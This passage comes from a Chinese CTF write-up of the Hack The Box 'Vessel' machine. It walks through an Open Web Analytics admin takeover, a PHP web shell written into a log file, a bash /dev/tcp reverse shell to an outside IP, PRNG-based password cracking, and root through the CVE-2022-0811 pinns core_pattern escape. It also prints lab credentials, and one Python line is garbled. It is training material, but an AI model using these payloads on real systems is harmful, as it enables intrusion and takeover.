_update_date&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;N;s:5:&quot;value&quot;;s:10:&quot;1650211659&quot;;s:9:&quot;data_type&quot;;s:6:&quot;BIGINT&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}s:7:&quot;api_key&quot;;O:12:&quot;owa_dbColumn&quot;:11:{s:4:&quot;name&quot;;s:7:&quot;api_key&quot;;s:5:&quot;value&quot;;s:32:&quot;a390cc0247ecada9a2b8d2338b9ca6d2&quot;;s:9:&quot;data_type&quot;;s:12:&quot;VARCHAR(255)&quot;;s:11:&quot;foreign_key&quot;;N;s:14:&quot;is_primary_key&quot;;b:0;s:14:&quot;auto_increment&quot;;b:0;s:9:&quot;is_unique&quot;;b:0;s:11:&quot;is_not_null&quot;;b:0;s:5:&quot;label&quot;;N;s:5:&quot;index&quot;;N;s:13:&quot;default_value&quot;;N;}}s:16:&quot;_tableProperties&quot;;a:4:{s:5:&quot;alias&quot;;s:4:&quot;user&quot;;s:4:&quot;name&quot;;s:8:&quot;owa_user&quot;;s:9:&quot;cacheable&quot;;b:1;s:23:&quot;cache_expiration_period&quot;;i:604800;}s:12:&quot;wasPersisted&quot;;b:1;s:5:&quot;cache&quot;;N;}
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2017.png" alt="20230402" loading="lazy"></figure>
+<h2 id="login-file-writer">Login &amp; file writer</h2>
+<h3 id="login-as-admin">login as admin</h3>
+<p>还是刚刚那篇分析cve的文章</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2018.png" alt="20230402" loading="lazy"></figure>
+<p>提到了可以用action： <strong><code>base.usersChangePassword</code></strong> 实现登录</p>
+<p>相关的源代码 （位于 <code>owa_usersChangePasswordController</code> 下）</p>
+<pre><code class="language-php">function action() {
+		
+		// needed for old style embedded install migration
+		if ( $this-&gt;getParam('is_embedded') ) {
+			
+			owa_coreAPI::setSetting('base', 'is_embedded', true);
+		}
+		
+		
+        $auth = owa_auth::get_instance();
+        $status = $auth-&gt;authenticateUserTempPasskey($this-&gt;params['k']);
+
+        // log to event queue
+        if ($status === true) {
+            $ed = owa_coreAPI::getEventDispatch();
+            $new_password = array('key' =&gt; $this-&gt;params['k'], 'password' =&gt; $this-&gt;params['password'], 'ip' =&gt; $_SERVER['REMOTE_ADDR'], 'user_id' =&gt; $auth-&gt;u-&gt;get('user_id'));
+            $ed-&gt;log($new_password, 'base.set_password');
+            $auth-&gt;deleteCredentials();
+            $this-&gt;setRedirectAction('base.loginForm');
+            $this-&gt;set('status_code', 3006);
+        } else {
+            $this-&gt;setRedirectAction('base.loginForm');
+            $this-&gt;set('error_code', 2011); // can't find key in the db
+        }
+    }
+</code></pre>
+<p>首先要读取 <code>$this-&gt;params['k']</code> 然后判定状态status为true，要构造的：</p>
+<ul>
+<li><code>$this-&gt;params['k']</code> ： 为刚刚的temp_passkey ac9e4437ca5150340fdd0578d70a4211</li>
+<li><code>$this-&gt;params['password']</code> 新得password</li>
+</ul>
+<pre><code class="language-php">owa_user_id=admin&amp;owa_password=qwe123&amp;owa_password2=qwe123&amp;owa_action=base.usersChangePassword&amp;owa_k=36bb6d5b1da9942b1447a1e226d34766
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2019.png" alt="20230402" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2020.png" alt="20230402" loading="lazy"></figure>
+<p>我这里做题太久了，靶场被重置了一下，所以temp_passkey换成最新的了。</p>
+<h3 id="php-file-write">php file write</h3>
+<p>根据那篇分析cve的<a href="https://devel0pment.de/?p=2494">文章</a>，点进settings，这里文件上传对应的action是 <strong><code>base.optionsUpdate</code></strong> 与之对应得Controller是 <strong><code>owa_optionsUpdateController</code></strong></p>
+<p>代码分析过程就不复述了，关键部分截图如下</p>
+<figure data-type="image" tabindex="22"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2021.png" alt="20230402" loading="lazy"></figure>
+<p><a href="https://www.notion.so">https://www.notion.so</a></p>
+<p>这里我们可以通过修改对应的 <code>base.error_log_file</code>  和 <code>base.error_log_level</code> ****来使得攻击者构造得内容写入文件中</p>
+<p>我们这里看<a href="http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral">http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</a> 也能看到对应的Log File所在目录</p>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2022.png" alt="20230402" loading="lazy"></figure>
+<p>创建请求测试，验证访问（发现文件被创建了）：<a href="http://openwebanalytics.vessel.htb/owa-data/logs/neko.php">http://openwebanalytics.vessel.htb/owa-data/logs/neko.php</a></p>
+<pre><code class="language-php">POST /index.php?owa_do=base.optionsGeneral HTTP/1.1
+Host: openwebanalytics.vessel.htb
+Content-Length: 185
+Cache-Control: max-age=0
+Origin: http://openwebanalytics.vessel.htb
+DNT: 1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral&amp;owa_site_id=&amp;owa_status_code=2500&amp;
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: owa_userSession=admin; owa_passwordSession=bf38e9d85b691942e25d3967408d1fc4fdbd0033b7d409d3f7b3617173e81409
+sec-gpc: 1
+Connection: close
+
+owa_config%5Bbase.error_log_level%5D=2&amp;owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/neko.php&amp;&amp;owa_nonce=81b2a1198d&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre>
+<p>拿shell(访问 <a href="http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.24/2333%200%3E%261%27"><code>http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.24/2333 0&gt;%261'</code></a></p>
+<pre><code class="language-php">owa_config%5Bbase.neko%5D=&lt;%3fphp+system($_REQUEST['cmd'])%3b+%3f&gt;&amp;&amp;&amp;owa_nonce=81b2a1198d&amp;owa_action=base.optionsUpdate&amp;owa_module=base
+</code></pre>
+<p>这里测试失败好几次，建议还是intercept拦截，一定要看到前端页面提示修改成功的英文提示，不然直接repeater改会有问题</p>
+<h2 id="user-flag">User flag</h2>
+<h3 id="连接服务器探索">连接服务器&amp;探索</h3>
+<p>本地nc</p>
+<pre><code class="language-php">nc -lnvp 2333
+</code></pre>
+<p>构造的请求</p>
+<pre><code class="language-php">http://openwebanalytics.vessel.htb/owa-data/logs/neko.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.24/2333%200%3E%261%27
+</code></pre>
+<p>然后升级shell</p>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2023.png" alt="20230402" loading="lazy"></figure>
+<p>home目录下只能进入steven</p>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2024.png" alt="20230402" loading="lazy"></figure>
+<p>查看steven目录下的文件passwordGenerator</p>
+<pre><code class="language-php">www-data@vessel:/home/steven$ file passwordGenerator
+file passwordGenerator
+passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
+</code></pre>
+<p>除此之外还有隐藏文件夹 <code>.notes</code> （通过 <code>ls -la</code> 查看到）开一个http服务器获取文件 （也可以用nc传文件）</p>
+<pre><code class="language-php">python3 -m http.server 9000
+</code></pre>
+<p>文件1：screenshot.png</p>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2025.png" alt="20230402" loading="lazy"></figure>
+<p>文件2：notes.pdf</p>
+<figure data-type="image" tabindex="27"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2026.png" alt="20230402" loading="lazy"></figure>
+<p>看到截图里有关键字Password Generator ，然后想到了刚刚file命令查看的那个文件（顺便也通过http服务器下载到本地了）</p>
+<h3 id="分析passwordgenerator">分析passwordGenerator</h3>
+<p>本地用strings提取字符串</p>
+<figure data-type="image" tabindex="28"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2027.png" alt="20230402" loading="lazy"></figure>
+<p>是pyinstaller exe的文件。使用<a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a></p>
+<pre><code class="language-php">python pyinstxtractor.py  /tmp/htb/passwordGenerator                                                                                                                                                                                 0 [15:01:23]
+[+] Processing /tmp/htb/passwordGenerator
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.7
+[+] Length of package: 34300131 bytes
+[+] Found 95 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pyside2.pyc
+[+] Possible entry point: passwordGenerator.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+</code></pre>
+<p>php下载  <code>uncomplye6</code>并用 uncomplye6 dump代码</p>
+<pre><code class="language-php">~ uncompyle6  passwordGenerator.pyc                                                                                                                                                                                                    (exploit) 0 [15:22:14]
+
+// 关键代码
+
+    def genPassword(self):
+        length = value  // 这里是32
+        char = index
+        if char == 0:
+            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
+        else:
+            if char == 1:
+                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+            else:
+                if char == 2:
+                    charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
+                else:
+                    try:
+                        qsrand(QTime.currentTime().msec())
+                        password = ''
+                        for i in range(length):
+                            idx = qrand() % len(charset)
+                            nchar = charset[idx]
+                            password += str(nchar)
+
+                    except:
+                        msg = QMessageBox()
+                        msg.setWindowTitle('Error')
+                        msg.setText('Error while generating password!, Send a message to the Author!')
+                        x = msg.exec_()
+
+                return password
+
+</code></pre>
+<h3 id="crack-password">Crack Password</h3>
+<p>刚刚图片的password length是32位，这里length为32，all characters意味着char==0</p>
+<p>结合已知py脚本，生成特定条件下的密码字典</p>
+<pre><code class="language-python">from PySide2.QtCore import *
+length = 32 
+charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'
+for i in range(0, 999):
+    qsrand(i)
+    password = ''
+    for i in range(length):
+        idx = qrand() % len(charset)
+        nchar = charset[idx]192.168.3.34：8000192192192
+        password += str(nchar)
+    print(password)
+</code></pre>
+<p>使用 <code>pdfcrack</code> 将上述输出作为wordlist破解对应pdf。这里有点坑的是，windows下生成的密码字典和linux下生成的会有差异。最后密码是</p>
+<pre><code class="language-python">YG7Q7RDzA+q&amp;ke~MJ8!yRzoI^VQxSqSS
+</code></pre>
+<figure data-type="image" tabindex="29"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2028.png" alt="20230402" loading="lazy"></figure>
+<h3 id="ethans-flag">ethan’s flag</h3>
+<p>用su切换到ethan或者ssh链接，密码是pdf里面的。成功拿下user flag</p>
+<pre><code class="language-python">b@mPRNSVTjjLKId1T
+</code></pre>
+<h2 id="root-flag">root flag</h2>
+<ol>
+<li>先用 <code>sudo -l</code> 查看ethan有什么权限，发现没有线索。</li>
+<li>用 <code>find</code> 命令查看用户/用户组所属的目录</li>
+</ol>
+<pre><code class="language-diff">find / -user ethan 2&gt;/dev/null | grep -Ev '^/(run|sys|proc|home)'
+find / -group ethan 2&gt;/dev/null | grep -Ev '^/(run|sys|proc|home)'
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2029.png" alt="20230402" loading="lazy"></figure>
+<h3 id="pinns">pinns</h3>
+<p><code>md5sum</code> 的结果去virustotal上查无果，用 <code>-h</code> 也无果。 用google dork的方法去搜索，语法：</p>
+<pre><code class="language-diff">&quot;/pinns&quot; namespaces  github
+</code></pre>
+<figure data-type="image" tabindex="31"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2030.png" alt="20230402" loading="lazy"></figure>
+<p>但是输入相关得参数却不是</p>
+<figure data-type="image" tabindex="32"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2031.png" alt="20230402" loading="lazy"></figure>
+<p>带exploit关键词搜，会搜到这篇<a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/">文章</a>，得知是CVE-2022-0811</p>
+<figure data-type="image" tabindex="33"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2032.png" alt="20230402" loading="lazy"></figure>
+<p>确认版本号：</p>
+<figure data-type="image" tabindex="34"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2033.png" alt="20230402" loading="lazy"></figure>
+<h3 id="cve-2022-0811">CVE-2022-0811</h3>
+<p>即使有大佬博客的学习，但持续性的啃hard的box，我差点啃不下去了……</p>
+<p>不过该看还是得看。</p>
+<blockquote>
+<p>0xdf：It is a vulnerability in the CRI-O container engine, an open source container engine which can replace Docker in Kubernetes implementation such as OpenShift.</p>
+</blockquote>
+<p>产生漏洞的原因是在 <code>version 1.19</code> 里盲目的添加了 sysctl的支持，而没有做内核参数绑定校验（如图，刚那篇文章里的）</p>
+<figure data-type="image" tabindex="35"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2034.png" alt="20230402" loading="lazy"></figure>
+<p>参考：<a href="https://docs.kernel.org/admin-guide/sysctl/">https://docs.kernel.org/admin-guide/sysctl/</a>  这里我们要想办法利用该漏洞滥用sysctl的特性拿到root access</p>
+<figure data-type="image" tabindex="36"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2035.png" alt="20230402" loading="lazy"></figure>
+<p>这里设置</p>
+<ul>
+<li><code>kernel.shm_rmid_forced=1</code></li>
+<li><code>kernel.core_pattern=|[script] #</code></li>
+</ul>
+<p>之所以是 <code>|</code> 开头看文档描述：</p>
+<pre><code class="language-diff">If the first character of the pattern is a ‘|’, the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file.
+</code></pre>
+<p>首先在exploit前先确认原始的参数值</p>
+<figure data-type="image" tabindex="37"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2036.png" alt="20230402" loading="lazy"></figure>
+<p>运行命令</p>
+<pre><code class="language-diff">pinns -s 'kernel.shm_rmid_forced=1'+'kernel.core_pattern=|/tmp/exp.sh #' -f filename -d /dev/shm -U
+</code></pre>
+<p>同样检查是否更改对应值。发现成功了</p>
+<pre><code class="language-diff">ethan@vessel:/dev/shm$ cat /proc/sys/kernel/core_pattern /proc/sys/kernel/shm_rmid_forced
+|/tmp/exp.sh #
+1
+</code></pre>
+<p>在 <code>exp.sh</code> 下写入如下内容，并用 <code>chmod</code> 赋予对应权限（ <code>+x</code> )</p>
+<pre><code class="language-diff">#!/bin/bash
+
+cp /bin/bash /tmp/htb
+chown root:root /tmp/htb
+chmod 4755 /tmp/htb
+</code></pre>
+<p>这个脚本是创建了一份bash得拷贝，并设置了对应的权限。同时我们的内核变量  `/proc/sys/kernel/core_pattern``  也已经指向到了该脚本</p>
+<p>然后</p>
+<pre><code class="language-diff">cp exp.sh .w  /dev/shm
+</code></pre>
+<p>执行</p>
+<pre><code class="language-diff">sleep 100&amp;
+killall -s SIGSEGV sleep
+</code></pre>
+<figure data-type="image" tabindex="38"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230402%2037.png" alt="20230402" loading="lazy"></figure>
+<p>拿到root的flag</p>
+<h2 id="结语">结语</h2>
+<p>虽然前面是express的mis-handle但是后续关于owa的历史版本1.7.3包含了大量的php代码审计部分，如果想训练代码审计结合实战是不错得选择。只是对我这种菜鸟代码量太多了，所以选择偷懒得方式直接看别人分析好的代码文章而不是clone历史漏洞版本。但，如果后续想要去尝试漏洞挖掘的时候回过头再过一遍这个分析的过程也是不错得选择。</p>
+<p>老实说那个passwordgenerator有点坑……hard的box确实很难（叹气） 继续练习，不要放弃。</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://0xdf.gitlab.io/2023/03/25/htb-vessel.html">https://0xdf.gitlab.io/2023/03/25/htb-vessel.html</a></li>
+<li><a href="https://pentesterlab.com/">https://pentesterlab.com/</a></li>
+<li><a href="https://devel0pment.de/?p=2494">https://devel0pment.de/?p=2494</a></li>
+<li><a href="https://docs.kernel.org/admin-guide/sysctl/">https://docs.kernel.org/admin-guide/sysctl/</a></li>
+</ul>
+]]></content>
+    </entry>
+</feed>
